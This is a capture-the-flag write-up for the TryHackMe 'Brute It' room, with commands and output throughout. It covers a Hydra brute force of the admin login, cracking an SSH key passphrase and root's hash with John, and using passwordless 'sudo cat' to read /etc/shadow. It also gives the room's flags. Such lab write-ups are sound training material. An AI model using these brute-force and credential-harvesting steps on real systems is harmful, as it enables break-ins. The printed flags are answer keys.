## Brute It - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/bruteit)

<i>Brute It!

In this box you will learn about:

- Brute-force

- Hash cracking

- Privilege escalation

Connect to the TryHackMe network, and deploy the machine.</i>

**IP: 10.10.141.37**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Brute-force, Hash cracking  <br>

**Tools Used**: Nmap, Gobuster, Hydra, John The Ripper

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.141.37 
  
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
  |   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
  |_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Apache2 Ubuntu Default Page: It works
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.htaccess            (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /.hta                 (Status: 403) [Size: 277]
  /admin                (Status: 301) [Size: 312] [--> http://10.10.141.37/admin/]
  /index.html           (Status: 200) [Size: 10918]
  /server-status        (Status: 403) [Size: 277]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- When I visited `http://10.10.141.37/admin`, there is a login page that we are going to brute force. I also found one more important information in the source code.

  ```
              <h1>LOGIN</h1>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
  ```

- That will cover whole reconnaissance part, moving to getting access to the target machine.
---

## ⚙️ Shell Access

- Since we know the username we will brute force our way into the login page with Hydra. Also, capture the login request with Burp so you can get parameters for Hydra.

  ```
  POST /admin/ HTTP/1.1
  Host: 10.10.141.37
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 20
  Origin: http://10.10.141.37
  Connection: keep-alive
  Referer: http://10.10.141.37/admin/
  Cookie: PHPSESSID=9su12482omgs2tvj319ab3ohg5
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  user=admin&pass=test
  ```

  ```
  hydra -l admin -P /rockyou.txt 10.10.141.37 http-post-form "/admin/:user=^USER^&pass=^PW^&Login=Login:Username or password invalid" 
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-08 16:13:23
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
  [DATA] attacking http-post-form://10.10.141.37:80/admin/:user=^USER^&pass=^PW^&Login=Login:Username or password invalid
  [SNIP!]
  [80][http-post-form] host: 10.10.141.37   login: admin   password: xavier
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-08 16:13:40
  ```
  
- Nice, we have full credentials now! After logging in you'll find the `web flag` and RSA key for SSH login. Save the RSA key, convert it to hash and crack it with John so you can get a passphrase.

  ```
  -----BEGIN RSA PRIVATE KEY-----
  Proc-Type: 4,ENCRYPTED
  DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
  
  [SNIP!]
  -----END RSA PRIVATE KEY-----
  ```

  ```
  ssh2john id_rsa > john.hash

  john --wordlist=/home/mauzware/Desktop/rockyou.txt john.hash                    
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
  Cost 2 (iteration count) is 1 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  rockinroll       (id_rsa)     
  1g 0:00:00:00 DONE (2025-05-08 16:16) 25.00g/s 1815Kp/s 1815Kc/s 1815KC/s rubicon..rock14
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.
  ```
  
- Now just login with found username, id_rsa key and passphrase. Don't foget to change permission of id_rsa to 600.

  ```
  chmod 600 id_rsa
  
  ssh -i id_rsa john@10.10.141.37
  The authenticity of host '10.10.141.37 (10.10.141.37)' can't be established.
  ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '10.10.141.37' (ED25519) to the list of known hosts.
  Enter passphrase for key 'id_rsa': 
  Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
  
    System information as of Thu May  8 15:17:35 UTC 2025
  
    System load:  0.0                Processes:           114
    Usage of /:   25.8% of 19.56GB   Users logged in:     0
    Memory usage: 61%                IP address for eth0: 10.10.141.37
    Swap usage:   0%
  
  
  63 packages can be updated.
  0 updates are security updates.
  
  
  Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
  
  john@bruteit:~$ whoami
  john
  john@bruteit:~$ id
  uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
  ```

- Perfect, let's get those flags shall we?

---

## 🧍 User Privilege Escalation

- You already know the hustle here. This will complete the shell access part.

  ```
  john@bruteit:~$ whoami
  john
  john@bruteit:~$ id
  uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
  john@bruteit:~$ ls
  user.txt
  john@bruteit:~$ cat user.txt 
  THM{a_password_is_not_a_barrier}
  ```
  
- Moving to escalation.

---

## 👑 Root Privilege Escalation

- It's time to finish the job! This one is pretty simple ngl, use `sudo -l` and you'll see what I'm talking about.

  ```
  john@bruteit:~$ sudo -l
  Matching Defaults entries for john on bruteit:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User john may run the following commands on bruteit:
      (root) NOPASSWD: /bin/cat
  ```
  
- You got it right? We can execute `cat` command as sudo without password. That will help us answer last two questions in this challenge. Let's get the flag first.

  ```
  john@bruteit:~$ sudo cat /root/root.txt
  THM{pr1v1l3g3_3sc4l4t10n}
  ```
  
- Now for the password, you have few different options. I just read the `/etc/shadow`, took root's hash and cracked it.

  ```
  john@bruteit:~$ sudo cat /etc/shadow
  root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
  daemon:*:18295:0:99999:7:::
  [SNIP!]
  thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
  sshd:*:18489:0:99999:7:::

  echo '$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.' > root.hash
  
  john --wordlist=/home/mauzware/Desktop/rockyou.txt --format=sha512crypt root.hash 
  Using default input encoding: UTF-8
  Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
  Cost 1 (iteration count) is 5000 for all loaded hashes
  Will run 2 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  football         (?)     
  1g 0:00:00:00 DONE (2025-05-08 16:22) 9.090g/s 2327p/s 2327c/s 2327C/s 123456..freedom
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
  ```

- That's it from my side, cya in the next one!

---

## 🏁 Flags

- **Web Flag**: `THM{brut3_f0rce_is_e4sy}`
- **User Flag**: `THM{a_password_is_not_a_barrier}`
- **Root Flag**: `THM{pr1v1l3g3_3sc4l4t10n}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, just sharpening my skills.`

- What did I learn?
  `Nothing much, just sharpening my skills.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
